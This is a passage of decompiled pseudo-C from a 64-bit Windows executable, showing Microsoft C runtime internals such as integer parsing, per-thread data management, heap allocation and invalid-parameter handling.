  v14 = v15 - 55;
LABEL_66:
  if ( v14 != 0 )
  {
LABEL_75:
    v21 = 10;
    goto LABEL_76;
  }
  v17 = *a2;
  v18 = **a2;
  v19 = *a2 + 1;
  *a2 = v19;
  if ( ((v18 - 88) & 0xFFDF) == 0 )
  {
    v9 = *v19;
    *a2 = v19 + 1;
    v21 = 16;
LABEL_76:
    if ( v6 != 0 )
      v21 = v6;
    v6 = v21;
    goto LABEL_79;
  }
  *a2 = v17;
  v20 = 8;
  if ( v6 != 0 )
    v20 = v6;
  v6 = v20;
  if ( v18 != 0 && *v17 != v18 )
  {
    *(_DWORD *)sub_140018888() = 22;
    invalid_parameter_noinfo();
  }
LABEL_79:
  v22 = 0xFFFFFFFF / v6;
  while ( 1 )
  {
    if ( v9 >= 0x30u )
    {
      if ( v9 < 0x3Au )
      {
        v23 = v9 - 48;
        goto LABEL_121;
      }
      if ( v9 >= 0xFF10u )
      {
        if ( v9 < 0xFF1Au )
        {
          v23 = v9 - 65296;
LABEL_121:
          if ( v23 != -1 )
            goto LABEL_130;
        }
      }
      else if ( v9 >= 0x660u )
      {
        if ( v9 < 0x66Au )
        {
          v23 = v9 - 1632;
          goto LABEL_121;
        }
        if ( v9 >= 0x6F0u )
        {
          if ( v9 < 0x6FAu )
          {
            v23 = v9 - 1776;
            goto LABEL_121;
          }
          v24 = 2406;
          if ( v9 >= 0x966u )
          {
            if ( v9 < 0x970u )
              goto LABEL_92;
            v24 = 2534;
            if ( v9 >= 0x9E6u )
            {
              if ( v9 < 0x9F0u )
                goto LABEL_92;
              v24 = 2662;
              if ( v9 >= 0xA66u )
              {
                if ( v9 < 0xA70u )
                  goto LABEL_92;
                v24 = 2790;
                if ( v9 >= 0xAE6u )
                {
                  if ( v9 < 0xAF0u )
                    goto LABEL_92;
                  v24 = 2918;
                  if ( v9 >= 0xB66u )
                  {
                    if ( v9 < 0xB70u )
                      goto LABEL_92;
                    v24 = 3174;
                    if ( v9 >= 0xC66u )
                    {
                      if ( v9 < 0xC70u )
                        goto LABEL_92;
                      v24 = 3302;
                      if ( v9 >= 0xCE6u )
                      {
                        if ( v9 < 0xCF0u )
                          goto LABEL_92;
                        v24 = 3430;
                        if ( v9 >= 0xD66u )
                        {
                          if ( v9 < 0xD70u )
                            goto LABEL_92;
                          v24 = 3664;
                          if ( v9 >= 0xE50u )
                          {
                            if ( v9 < 0xE5Au )
                              goto LABEL_92;
                            v24 = 3792;
                            if ( v9 >= 0xED0u )
                            {
                              if ( v9 < 0xEDAu )
                                goto LABEL_92;
                              v24 = 3872;
                              if ( v9 >= 0xF20u )
                              {
                                if ( v9 < 0xF2Au )
                                  goto LABEL_92;
                                v24 = 4160;
                                if ( v9 >= 0x1040u )
                                {
                                  if ( v9 < 0x104Au )
                                    goto LABEL_92;
                                  v24 = 6112;
                                  if ( v9 >= 0x17E0u )
                                  {
                                    if ( v9 < 0x17EAu )
                                    {
LABEL_92:
                                      v23 = v9 - v24;
                                      goto LABEL_121;
                                    }
                                    if ( (unsigned __int16)(v9 - 6160) <= 9u )
                                    {
                                      v23 = v9 - 6160;
                                      goto LABEL_121;
                                    }
                                  }
                                }
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
    if ( ((v25 = v9, v9 < 0x41u) || v9 > 0x5Au) && (v9 < 0x61u || v9 > 0x7Au) )
    {
      v23 = -1;
    }
    else
    {
      if ( (unsigned __int16)(v9 - 97) <= 0x19u )
        v25 = v9 - 32;
      v23 = v25 - 55;
    }
LABEL_130:
    v26 = *a2;
    if ( v23 >= v6 )
      break;
    v9 = *v26;
    v27 = v6 * v10 + v23;
    v28 = v27 < v6 * v10;
    v29 = v10 < v22;
    v30 = v10 == v22;
    v10 = v27;
    *a2 = v26 + 1;
    v12 |= (4 * (!v29 && !v30 || v28)) | 8;
  }
  *a2 = v26 - 1;
  if ( v9 != 0 && *(v26 - 1) != v9 )
  {
    *(_DWORD *)sub_140018888() = 22;
    invalid_parameter_noinfo();
  }
  if ( (v12 & 8) != 0 )
  {
    result = 0x7FFFFFFF;
    if ( (v12 & 4) != 0 )
      goto LABEL_143;
    if ( (v12 & 1) != 0 )
    {
      if ( (v12 & 2) == 0 )
      {
        if ( v10 <= 0x7FFFFFFF )
          goto LABEL_145;
        goto LABEL_143;
      }
      if ( v10 > 0x80000000 )
      {
LABEL_143:
        *((_BYTE *)a1 + 48) = 1;
        *((_DWORD *)a1 + 11) = 34;
        if ( (v12 & 1) != 0 )
        {
          v34 = (wint_t **)a2[1];
          if ( (v12 & 2) != 0 )
          {
            if ( v34 != nullptr )
              *v34 = *a2;
            return 0x80000000LL;
          }
          else if ( v34 != nullptr )
          {
            *v34 = *a2;
          }
          return result;
        }
        v10 = -1;
LABEL_145:
        v33 = (wint_t **)a2[1];
        if ( v33 != nullptr )
          *v33 = *a2;
        return v10;
      }
    }
    else if ( (v12 & 2) == 0 )
    {
      goto LABEL_145;
    }
    v10 = -v10;
    goto LABEL_145;
  }
  v31 = (wint_t **)a2[1];
  *a2 = v35;
  if ( v31 != nullptr )
    *v31 = v35;
  return 0;
}


// ----- unknown_libname_84 @ 0x14001c26c -----
// Microsoft VisualC 64bit universal runtime
__int64 __fastcall unknown_libname_84(wint_t *a1)
{
  unsigned int v1; // edi
  int v2; // ebx
  int v3; // ebx
  wint_t *v5[2]; // [rsp+20h] [rbp-50h] BYREF
  _QWORD v6[2]; // [rsp+30h] [rbp-40h] BYREF
  char v7; // [rsp+40h] [rbp-30h]
  __int128 v8; // [rsp+48h] [rbp-28h]
  char v9; // [rsp+58h] [rbp-18h]
  int v10; // [rsp+5Ch] [rbp-14h]
  char v11; // [rsp+60h] [rbp-10h]
  int v12; // [rsp+64h] [rbp-Ch]
  char v13; // [rsp+68h] [rbp-8h]

  v6[0] = 0;
  v7 = 0;
  v9 = 0;
  v11 = 0;
  v13 = 0;
  if ( dword_1400A0560 == 0 )
  {
    v9 = 1;
    v8 = *(_OWORD *)&off_14009ECA8;
  }
  v5[1] = nullptr;
  v5[0] = a1;
  v1 = __crt_strtox::parse_integer<unsigned __int64,__crt_strtox::c_string_character_source<wchar_t>,1>(
         (__crt_cached_ptd_host *)v6,
         v5,
         0xAu,
         1);
  if ( v9 == 2 )
    *(_DWORD *)(v6[0] + 936LL) &= ~2u;
  if ( v11 != 0 )
  {
    v2 = v10;
    *(_DWORD *)(unknown_libname_79((__int64)v6) + 32) = v2;
  }
  if ( v13 != 0 )
  {
    v3 = v12;
    *(_DWORD *)(unknown_libname_79((__int64)v6) + 36) = v3;
  }
  return v1;
}


// ----- __crtLCMapStringW @ 0x14001c320 -----
__int64 __fastcall _crtLCMapStringW(__int64 a1, unsigned int a2, _WORD *a3, int a4, __int64 a5, int a6)
{
  int v6; // ebx
  int v10; // eax
  bool v11; // cc

  v6 = a4;
  if ( a4 > 0 )
  {
    v10 = sub_140017760(a3, a4);
    v11 = v10 < v6;
    v6 = v10 + 1;
    if ( !v11 )
      v6 = v10;
  }
  return sub_14001D5CC(a1, a2, a3, (unsigned int)v6, a5, a6, 0, 0, 0);
}


// ----- ??$?RV_lambda_72d1df2b273a38828b1ce30cbf4cdab5_@@AEAV_lambda_876a65b173b8412d3a47c70a915b0cf4_@@V_lambda_41932305e351933ebe8f8be3ed8bb5dc_@@@?$__crt_seh_guarded_call@X@@QEAAX$$QEAV_lambda_72d1df2b273a38828b1ce30cbf4cdab5_@@AEAV_lambda_876a65b173b8412d3a47c70a915b0cf4_@@$$QEAV_lambda_41932305e351933ebe8f8be3ed8bb5dc_@@@Z @ 0x14001c3a8 -----
void __fastcall __crt_seh_guarded_call<void>::operator()<_lambda_72d1df2b273a38828b1ce30cbf4cdab5_,_lambda_876a65b173b8412d3a47c70a915b0cf4_ &,_lambda_41932305e351933ebe8f8be3ed8bb5dc_>(
        __int64 a1,
        int *a2,
        __int64 a3,
        int *a4)
{
  _vcrt_lock(*a2);
  _InterlockedIncrement(*(volatile signed __int32 **)(**(_QWORD **)a3 + 136LL));
  _vcrt_unlock(*a4);
}


// ----- ??$?RV_lambda_fb3a7dec4e47f37f22dae91bb15c9095_@@AEAV_lambda_698284760c8add0bfb0756c19673e34b_@@V_lambda_dfb8eca1e75fef3034a8fb18dd509707_@@@?$__crt_seh_guarded_call@X@@QEAAX$$QEAV_lambda_fb3a7dec4e47f37f22dae91bb15c9095_@@AEAV_lambda_698284760c8add0bfb0756c19673e34b_@@$$QEAV_lambda_dfb8eca1e75fef3034a8fb18dd509707_@@@Z @ 0x14001c3e8 -----
void __fastcall __crt_seh_guarded_call<void>::operator()<_lambda_fb3a7dec4e47f37f22dae91bb15c9095_,_lambda_698284760c8add0bfb0756c19673e34b_ &,_lambda_dfb8eca1e75fef3034a8fb18dd509707_>(
        __int64 a1,
        int *a2,
        struct __acrt_ptd *const **a3,
        int *a4)
{
  _vcrt_lock(*a2);
  replace_current_thread_locale_nolock(**a3, nullptr);
  _vcrt_unlock(*a4);
}


// ----- ??$?RV_lambda_5e887d1dcbef67a5eb4283622ba103bf_@@AEAV_lambda_4466841279450cc726390878d4a41900_@@V_lambda_341c25c0346d94847f1f3c463c57e077_@@@?$__crt_seh_guarded_call@X@@QEAAX$$QEAV_lambda_5e887d1dcbef67a5eb4283622ba103bf_@@AEAV_lambda_4466841279450cc726390878d4a41900_@@$$QEAV_lambda_341c25c0346d94847f1f3c463c57e077_@@@Z @ 0x14001c428 -----
void __fastcall __crt_seh_guarded_call<void>::operator()<_lambda_5e887d1dcbef67a5eb4283622ba103bf_,_lambda_4466841279450cc726390878d4a41900_ &,_lambda_341c25c0346d94847f1f3c463c57e077_>(
        __int64 a1,
        int *a2,
        __int64 a3,
        int *a4)
{
  _vcrt_lock(*a2);
  replace_current_thread_locale_nolock(
    **(struct __acrt_ptd *const **)a3,
    ***(struct __crt_locale_data *const ***)(a3 + 8));
  _vcrt_unlock(*a4);
}


// ----- ??$?RV_lambda_46352004c1216016012b18bd6f87e700_@@AEAV_lambda_3bd07e1a1191394380780325891bf33f_@@V_lambda_334532d3f185bcaa59b5be82d7d22bff_@@@?$__crt_seh_guarded_call@X@@QEAAX$$QEAV_lambda_46352004c1216016012b18bd6f87e700_@@AEAV_lambda_3bd07e1a1191394380780325891bf33f_@@$$QEAV_lambda_334532d3f185bcaa59b5be82d7d22bff_@@@Z @ 0x14001c470 -----
void __fastcall __crt_seh_guarded_call<void>::operator()<_lambda_46352004c1216016012b18bd6f87e700_,_lambda_3bd07e1a1191394380780325891bf33f_ &,_lambda_334532d3f185bcaa59b5be82d7d22bff_>(
        __int64 a1,
        int *a2,
        __int64 a3,
        int *a4)
{
  void *v6; // rcx

  _vcrt_lock(*a2);
  v6 = *(void **)(**(_QWORD **)a3 + 136LL);
  if ( v6 != nullptr && _InterlockedExchangeAdd((volatile signed __int32 *)v6, 0xFFFFFFFF) == 1 && v6 != &unk_14009EFC0 )
    free_base(v6);
  _vcrt_unlock(*a4);
}


// ----- ?construct_ptd_array@@YAXQEAU__acrt_ptd@@@Z @ 0x14001c4d0 -----
void __fastcall construct_ptd_array(struct __acrt_ptd *const a1)
{
  int v1; // [rsp+20h] [rbp-30h] BYREF
  int v2; // [rsp+24h] [rbp-2Ch] BYREF
  struct __acrt_ptd *v3; // [rsp+28h] [rbp-28h] BYREF
  __int64 *v4; // [rsp+30h] [rbp-20h] BYREF
  struct __acrt_ptd **v5; // [rsp+38h] [rbp-18h] BYREF
  _QWORD v6[2]; // [rsp+40h] [rbp-10h] BYREF
  char v7; // [rsp+68h] [rbp+18h] BYREF
  int v8; // [rsp+70h] [rbp+20h] BYREF
  int v9; // [rsp+78h] [rbp+28h] BYREF

  v3 = a1;
  v5 = &v3;
  v8 = 5;
  v9 = 5;
  v6[0] = &v3;
  v6[1] = &v4;
  v1 = 4;
  v2 = 4;
  v4 = &qword_1400A05B0;
  *((_DWORD *)a1 + 10) = 1;
  *(_QWORD *)v3 = &unk_140091890;
  *((_DWORD *)v3 + 234) = 1;
  *((_QWORD *)v3 + 17) = &unk_14009EFC0;
  *((_WORD *)v3 + 94) = 67;
  *((_WORD *)v3 + 225) = 67;
  *((_QWORD *)v3 + 116) = 0;
  __crt_seh_guarded_call<void>::operator()<_lambda_72d1df2b273a38828b1ce30cbf4cdab5_,_lambda_876a65b173b8412d3a47c70a915b0cf4_ &,_lambda_41932305e351933ebe8f8be3ed8bb5dc_>(
    (__int64)&v7,
    &v9,
    (__int64)&v5,
    &v8);
  __crt_seh_guarded_call<void>::operator()<_lambda_5e887d1dcbef67a5eb4283622ba103bf_,_lambda_4466841279450cc726390878d4a41900_ &,_lambda_341c25c0346d94847f1f3c463c57e077_>(
    (__int64)&v7,
    &v2,
    (__int64)v6,
    &v1);
}


// ----- ?destroy_fls@@YAXPEAX@Z @ 0x14001c5a0 -----
void __fastcall destroy_fls(struct __acrt_ptd *lpFlsData)
{
  if ( lpFlsData != nullptr )
  {
    destroy_ptd_array(lpFlsData);
    free_base(lpFlsData);
  }
}


// ----- ?destroy_ptd_array@@YAXQEAU__acrt_ptd@@@Z @ 0x14001c5c0 -----
void __fastcall destroy_ptd_array(void **a1)
{
  int v1; // [rsp+20h] [rbp-20h] BYREF
  int v2; // [rsp+24h] [rbp-1Ch] BYREF
  void **v3; // [rsp+28h] [rbp-18h] BYREF
  void ***v4; // [rsp+30h] [rbp-10h] BYREF
  void ***v5; // [rsp+38h] [rbp-8h] BYREF
  char v6; // [rsp+58h] [rbp+18h] BYREF
  int v7; // [rsp+60h] [rbp+20h] BYREF
  int v8; // [rsp+68h] [rbp+28h] BYREF

  v3 = a1;
  v4 = &v3;
  v7 = 5;
  v8 = 5;
  v5 = &v3;
  v1 = 4;
  v2 = 4;
  if ( *a1 != &unk_140091890 )
  {
    free_base(*a1);
    a1 = v3;
  }
  free_base(a1[14]);
  free_base(v3[11]);
  free_base(v3[12]);
  free_base(v3[13]);
  free_base(v3[9]);
  free_base(v3[10]);
  free_base(v3[15]);
  free_base(v3[16]);
  free_base(v3[120]);
  __crt_seh_guarded_call<void>::operator()<_lambda_46352004c1216016012b18bd6f87e700_,_lambda_3bd07e1a1191394380780325891bf33f_ &,_lambda_334532d3f185bcaa59b5be82d7d22bff_>(
    (__int64)&v6,
    &v8,
    (__int64)&v4,
    &v7);
  __crt_seh_guarded_call<void>::operator()<_lambda_fb3a7dec4e47f37f22dae91bb15c9095_,_lambda_698284760c8add0bfb0756c19673e34b_ &,_lambda_dfb8eca1e75fef3034a8fb18dd509707_>(
    (__int64)&v6,
    &v2,
    (struct __acrt_ptd *const **)&v5,
    &v1);
}


// ----- sub_14001C6B8 @ 0x14001c6b8 -----
struct __acrt_ptd *sub_14001C6B8()
{
  DWORD LastError; // edi
  struct __acrt_ptd *v1; // rsi
  struct __acrt_ptd *v3; // rax
  struct __acrt_ptd *v4; // rbx

  LastError = GetLastError();
  v1 = nullptr;
  if ( !FlsSetValue(dword_14009EB40, (PVOID)0xFFFFFFFFFFFFFFFFLL) )
    goto LABEL_2;
  v3 = (struct __acrt_ptd *)calloc_base(1u, 0x3C8u);
  v4 = v3;
  if ( v3 == nullptr )
  {
    FlsSetValue(dword_14009EB40, nullptr);
    free_base(nullptr);
LABEL_2:
    SetLastError(LastError);
    return nullptr;
  }
  if ( FlsSetValue(dword_14009EB40, v3) )
  {
    construct_ptd_array(v4);
    free_base(nullptr);
    v1 = v4;
  }
  else
  {
    FlsSetValue(dword_14009EB40, nullptr);
    free_base(v4);
  }
  SetLastError(LastError);
  return v1;
}


// ----- ?replace_current_thread_locale_nolock@@YAXQEAU__acrt_ptd@@QEAU__crt_locale_data@@@Z @ 0x14001c770 -----
void __fastcall replace_current_thread_locale_nolock(
        struct __acrt_ptd *const a1,
        struct __crt_locale_data *const a2,
        __int64 a3,
        __int64 a4)
{
  __int64 v6; // rcx
  wchar_t **v7; // rcx

  v6 = *((_QWORD *)a1 + 18);
  if ( v6 != 0 )
  {
    _acrt_release_locale_ref(v6);
    v7 = *((wchar_t ***)a1 + 18);
    if ( v7 != (wchar_t **)qword_1400A05B0 && v7 != &off_14009EB50 && *((_DWORD *)v7 + 4) == 0 )
      _acrt_free_locale(v7);
  }
  *((_QWORD *)a1 + 18) = a2;
  if ( a2 != nullptr )
    _acrt_add_locale_ref(a2, a2, a3, a4);
}


// ----- sub_14001C7D8 @ 0x14001c7d8 -----
__int64 sub_14001C7D8()
{
  __int64 result; // rax

  result = sub_14001C838();
  if ( result == 0 )
    abort();
  return result;
}


// ----- sub_14001C7F4 @ 0x14001c7f4 -----
void *sub_14001C7F4()
{
  void *result; // rax

  if ( dword_14009EB40 == -1 )
    result = nullptr;
  else
    result = FlsGetValue(dword_14009EB40);
  if ( result == (void *)-1LL || result == nullptr && (result = sub_14001C6B8()) == nullptr )
    abort();
  return result;
}


// ----- sub_14001C838 @ 0x14001c838 -----
struct __acrt_ptd *sub_14001C838()
{
  void *v0; // rdi
  __int64 v1; // rax
  DWORD LastError; // ebx
  void *Value; // rax

  v0 = nullptr;
  if ( byte_1400A05A8 != 0 )
  {
    if ( dword_14009EB40 == -1 )
      v1 = 0;
    else
      v1 = sub_14001D3BC(dword_14009EB40);
    if ( v1 != -1 )
    {
      if ( v1 == 0 )
        return sub_14001C6B8();
      return (struct __acrt_ptd *)v1;
    }
  }
  else
  {
    LastError = GetLastError();
    if ( dword_14009EB40 == -1 )
      Value = nullptr;
    else
      Value = FlsGetValue(dword_14009EB40);
    if ( Value != (void *)-1LL )
    {
      if ( Value == nullptr )
        Value = sub_14001C6B8();
      v0 = Value;
    }
    SetLastError(LastError);
  }
  return (struct __acrt_ptd *)v0;
}


// ----- sub_14001C8C8 @ 0x14001c8c8 -----
char *__fastcall sub_14001C8C8(__int64 a1, __int64 a2)
{
  __int64 v3; // rbx
  char *Value; // rax

  v3 = 0;
  if ( dword_14009EB40 == -1 )
    Value = nullptr;
  else
    Value = (char *)FlsGetValue(dword_14009EB40);
  if ( Value != (char *)-1LL )
  {
    if ( Value != nullptr )
      return &Value[968 * a2];
    Value = (char *)sub_14001C6B8();
    if ( Value != nullptr )
      return &Value[968 * a2];
  }
  return (char *)v3;
}


// ----- sub_14001C924 @ 0x14001c924 -----
char sub_14001C924()
{
  byte_1400A05A8 = sub_14001D910();
  dword_14009EB40 = FlsAlloc((PFLS_CALLBACK_FUNCTION)destroy_fls);
  if ( dword_14009EB40 == -1 )
    return 0;
  if ( sub_14001C838() == nullptr )
  {
    _vcrt_uninitialize_ptd(0);
    return 0;
  }
  return 1;
}


// ----- __vcrt_uninitialize_ptd @ 0x14001c968 -----
char _vcrt_uninitialize_ptd()
{
  if ( dword_14009EB40 != -1 )
  {
    FlsFree(dword_14009EB40);
    dword_14009EB40 = -1;
  }
  return 1;
}


// ----- sub_14001C98C @ 0x14001c98c -----
__int64 __fastcall sub_14001C98C(__int64 a1, __int64 *a2)
{
  __int64 result; // rax

  result = qword_1400A05B0;
  if ( *a2 != qword_1400A05B0 )
  {
    result = *(unsigned int *)(a1 + 936);
    if ( ((unsigned int)result & dword_14009EE10) == 0 )
    {
      result = _acrt_update_thread_locale_data();
      *a2 = result;
    }
  }
  return result;
}


// ----- sub_14001C9C0 @ 0x14001c9c0 -----
__int64 __fastcall sub_14001C9C0(__int64 a1, __int64 *a2, __int64 a3)
{
  __int64 result; // rax

  result = qword_1400A05B0[a3];
  if ( *a2 != result )
  {
    result = *(unsigned int *)(a1 + 936);
    if ( ((unsigned int)result & dword_14009EE10) == 0 )
    {
      result = _acrt_update_thread_locale_data();
      *a2 = result;
    }
  }
  return result;
}


// ----- sub_14001C9F8 @ 0x14001c9f8 -----
__int64 __fastcall sub_14001C9F8(__int64 a1, __int64 *a2)
{
  __int64 result; // rax

  result = (__int64)qword_1400A0BC0;
  if ( (struct __crt_multibyte_data *)*a2 != qword_1400A0BC0 )
  {
    result = *(unsigned int *)(a1 + 936);
    if ( ((unsigned int)result & dword_14009EE10) == 0 )
    {
      result = _acrt_update_thread_multibyte_data();
      *a2 = result;
    }
  }
  return result;
}


// ----- sub_14001CA2C @ 0x14001ca2c -----
__int64 __fastcall sub_14001CA2C(__int64 a1, __int64 *a2, __int64 a3)
{
  __int64 result; // rax

  result = (__int64)*(&qword_1400A0BC0 + a3);
  if ( *a2 != result )
  {
    result = *(unsigned int *)(a1 + 936);
    if ( ((unsigned int)result & dword_14009EE10) == 0 )
    {
      result = _acrt_update_thread_multibyte_data();
      *a2 = result;
    }
  }
  return result;
}


// ----- _free_base @ 0x14001ca70 -----
void __cdecl free_base(void *Block)
{
  DWORD LastError; // eax
  int v2; // ebx

  if ( Block != nullptr && !HeapFree(hHeap, 0, Block) )
  {
    LastError = GetLastError();
    v2 = sub_140018748(LastError);
    *(_DWORD *)sub_140018888() = v2;
  }
}


// ----- sub_14001CAC0 @ 0x14001cac0 -----
HANDLE sub_14001CAC0()
{
  return hHeap;
}


// ----- ?get_raw_ptd_noexit@__crt_cached_ptd_host@@QEAAPEAU__acrt_ptd@@XZ @ 0x14001cac8 -----
struct __acrt_ptd *__fastcall __crt_cached_ptd_host::get_raw_ptd_noexit(__crt_cached_ptd_host *this)
{
  char *v1; // rsi
  __int64 v2; // rdi
  char *v4; // rax
  DWORD v5; // ecx
  DWORD dwErrCode; // [rsp+30h] [rbp+8h] BYREF

  v1 = *(char **)this;
  v2 = 0;
  if ( *(_QWORD *)this == 0 )
  {
    dwErrCode = GetLastError();
    if ( *((_BYTE *)this + 16) != 0 )
    {
      v2 = *((_QWORD *)this + 1);
    }
    else
    {
      *((_QWORD *)this + 1) = 0;
      *((_BYTE *)this + 16) = 1;
    }
    v4 = sub_14001C8C8((__int64)&dwErrCode, v2);
    v5 = dwErrCode;
    v1 = v4;
    *(_QWORD *)this = v4;
    SetLastError(v5);
  }
  return (struct __acrt_ptd *)v1;
}


// ----- ?value@?$dual_state_global@P6AXPEB_W00I_K@Z@__crt_state_management@@QEAAAEAP6AXPEB_W00I_K@ZAEAV__crt_cached_ptd_host@@@Z @ 0x14001cb34 -----
__int64 __fastcall __crt_state_management::dual_state_global<void (*)(wchar_t const *,wchar_t const *,wchar_t const *,unsigned int,unsigned __int64)>::value(
        __int64 a1,
        __int64 a2)
{
  __int64 v2; // rbx
  DWORD LastError; // eax

  v2 = 0;
  if ( *(_BYTE *)(a2 + 16) != 0 )
  {
    v2 = *(_QWORD *)(a2 + 8);
  }
  else
  {
    LastError = GetLastError();
    *(_QWORD *)(a2 + 8) = 0;
    *(_BYTE *)(a2 + 16) = 1;
    SetLastError(LastError);
  }
  return a1 + 8 * v2;
}


// ----- sub_14001CB80 @ 0x14001cb80 -----
void __fastcall sub_14001CB80(int a1, unsigned int a2, unsigned int a3)
{
  ULONG64 Rip; // r14
  struct _IMAGE_RUNTIME_FUNCTION_ENTRY *v7; // rax
  BOOL v8; // edi
  unsigned __int64 ImageBase; // [rsp+40h] [rbp-C0h] BYREF
  unsigned __int64 EstablisherFrame; // [rsp+48h] [rbp-B8h] BYREF
  PVOID HandlerData; // [rsp+50h] [rbp-B0h] BYREF
  struct _EXCEPTION_POINTERS ExceptionInfo; // [rsp+58h] [rbp-A8h] BYREF
  _QWORD v13[20]; // [rsp+70h] [rbp-90h] BYREF
  struct _CONTEXT ContextRecord; // [rsp+110h] [rbp+10h] BYREF
  DWORD64 retaddr; // [rsp+608h] [rbp+508h]
  __int64 v16; // [rsp+610h] [rbp+510h] BYREF

  if ( a1 != -1 )
    sub_140011008();
  memset(v13, 0, 0x98u);
  memset(&ContextRecord, 0, sizeof(ContextRecord));
  EstablisherFrame = 0;
  ImageBase = 0;
  HandlerData = nullptr;
  ExceptionInfo.ExceptionRecord = (PEXCEPTION_RECORD)v13;
  ExceptionInfo.ContextRecord = &ContextRecord;
  RtlCaptureContext(&ContextRecord);
  Rip = ContextRecord.Rip;
  v7 = RtlLookupFunctionEntry(ContextRecord.Rip, &ImageBase, nullptr);
  if ( v7 != nullptr )
    RtlVirtualUnwind(0, ImageBase, Rip, v7, &ContextRecord, &HandlerData, &EstablisherFrame, nullptr);
  ContextRecord.Rip = retaddr;
  v13[0] = __PAIR64__(a3, a2);
  ContextRecord.Rsp = (DWORD64)&v16;
  v13[2] = retaddr;
  v8 = IsDebuggerPresent();
  SetUnhandledExceptionFilter(nullptr);
  if ( UnhandledExceptionFilter(&ExceptionInfo) == 0 && !v8 && a1 != -1 )
    sub_140011008();
}


// ----- sub_14001CCF0 @ 0x14001ccf0 -----
void __fastcall sub_14001CCF0(__int64 a1)
{
  qword_1400A05B8 = a1;
}


// ----- _invalid_parameter @ 0x14001ccf8 -----
__int64 __fastcall invalid_parameter(wchar_t *a1, wchar_t *a2, wchar_t *a3, unsigned int a4, uintptr_t a5)
{
  __int64 result; // rax
  int v6; // ebx
  int v7; // ebx
  _QWORD v8[2]; // [rsp+30h] [rbp-40h] BYREF
  char v9; // [rsp+40h] [rbp-30h]
  __int128 v10; // [rsp+48h] [rbp-28h]
  char v11; // [rsp+58h] [rbp-18h]
  int v12; // [rsp+5Ch] [rbp-14h]
  char v13; // [rsp+60h] [rbp-10h]
  int v14; // [rsp+64h] [rbp-Ch]
  char v15; // [rsp+68h] [rbp-8h]

  v8[0] = 0;
  v9 = 0;
  v11 = 0;
  v13 = 0;
  v15 = 0;
  if ( dword_1400A0560 == 0 )
  {
    v11 = 1;
    v10 = *(_OWORD *)&off_14009ECA8;
  }
  result = sub_14001CD94(a1, a2, a3, a4, a5, (__crt_cached_ptd_host *)v8);
  if ( v11 == 2 )
  {
    result = v8[0];
    *(_DWORD *)(v8[0] + 936LL) &= ~2u;
  }
  if ( v13 != 0 )
  {
    v6 = v12;
    result = unknown_libname_79((__int64)v8);
    *(_DWORD *)(result + 32) = v6;
  }
  if ( v15 != 0 )
  {
    v7 = v14;
    result = unknown_libname_79((__int64)v8);
    *(_DWORD *)(result + 36) = v7;
  }
  return result;
}


// ----- sub_14001CD94 @ 0x14001cd94 -----
__int64 __fastcall sub_14001CD94(
        wchar_t *Expression,
        wchar_t *FunctionName,
        wchar_t *FileName,
        unsigned int LineNo,
        uintptr_t Reserved,
        __crt_cached_ptd_host *a6)
{
  struct __acrt_ptd *raw_ptd_noexit; // rax
  __int64 (__fastcall *v11)(wchar_t *, wchar_t *, wchar_t *, _QWORD, uintptr_t); // rax
  __int64 (__fastcall *v13)(wchar_t *, wchar_t *, wchar_t *, _QWORD, uintptr_t); // r10

  raw_ptd_noexit = __crt_cached_ptd_host::get_raw_ptd_noexit(a6);
  if ( raw_ptd_noexit != nullptr )
  {
    v11 = *((__int64 (__fastcall **)(wchar_t *, wchar_t *, wchar_t *, _QWORD, uintptr_t))raw_ptd_noexit + 119);
    if ( v11 != nullptr )
      return v11(Expression, FunctionName, FileName, LineNo, Reserved);
  }
  v13 = (__int64 (__fastcall *)(wchar_t *, wchar_t *, wchar_t *, _QWORD, uintptr_t))__ROR8__(
                                                                                      _security_cookie
                                                                                    ^ *(_QWORD *)__crt_state_management::dual_state_global<void (*)(wchar_t const *,wchar_t const *,wchar_t const *,unsigned int,unsigned __int64)>::value(
                                                                                                   (__int64)&qword_1400A05B8,
                                                                                                   (__int64)a6),
                                                                                      _security_cookie & 0x3F);
  if ( v13 == nullptr )
    invoke_watson(Expression, FunctionName, FileName, LineNo, Reserved);
  return v13(Expression, FunctionName, FileName, LineNo, Reserved);
}


// ----- _invalid_parameter_noinfo @ 0x14001ce4c -----
void __cdecl invalid_parameter_noinfo()
{
  invalid_parameter(nullptr, nullptr, nullptr, 0, 0);
}


// ----- _invoke_watson @ 0x14001ce6c -----
void __cdecl __noreturn invoke_watson(
        const wchar_t *Expression,
        const wchar_t *FunctionName,
        const wchar_t *FileName,
        unsigned int LineNo,
        uintptr_t Reserved)
{
  HANDLE CurrentProcess; // rax

  if ( IsProcessorFeaturePresent(0x17u) )
    __fastfail(5u);
  sub_14001CB80(2, 0xC0000417, 1u);
  CurrentProcess = GetCurrentProcess();
  TerminateProcess(CurrentProcess, 0xC0000417);
}


// ----- _calloc_base @ 0x14001cec0 -----
void *__cdecl calloc_base(size_t Count, size_t Size)
{
  size_t v2; // rbx
  void *result; // rax

  if ( Count != 0 && 0xFFFFFFFFFFFFFFE0uLL / Count < Size )
  {
LABEL_10:
    *(_DWORD *)sub_140018888() = 12;
    return nullptr;
  }
  else
  {
    v2 = Size * Count;
    if ( Size * Count == 0 )
      v2 = 1;
    while ( 1 )
    {
      result = HeapAlloc(hHeap, 8u, v2);
      if ( result != nullptr )
        break;
      if ( (unsigned int)sub_14001B360() == 0 || (unsigned int)sub_14001B3B0(v2) == 0 )
        goto LABEL_10;
    }
  }
  return result;
}


// ----- LocaleEnumProc @ 0x14001cf38 -----
BOOL __fastcall LocaleEnumProc(LPWSTR a1)
{
  return ((BOOL (__fastcall *)(LPWSTR, _QWORD, _QWORD))qword_1400A0678)(a1, 0, 0);
}


// ----- sub_14001CF4C @ 0x14001cf4c -----
__int64 __fastcall sub_14001CF4C(__int64 a1, int *a2, __int64 **a3, int *a4)
{
  _vcrt_lock(*a2);
  qword_1400A0678 = **a3;
  LODWORD(a3) = EnumSystemLocalesW((LOCALE_ENUMPROCW)LocaleEnumProc, 1u);
  qword_1400A0678 = 0;
  _vcrt_unlock(*a4);
  return (unsigned int)a3;
}


// ----- sub_14001CFA8 @ 0x14001cfa8 -----
__int64 sub_14001CFA8()
{
  if ( qword_1400A5008 == -1 )
    return 0;
  if ( qword_1400A5008 != 0 )
    return qword_1400A5008;
  return sub_14001CFE0(1, "CompareStringEx", "\b", "CompareStringEx");
}


// ----- sub_14001CFE0 @ 0x14001cfe0 -----
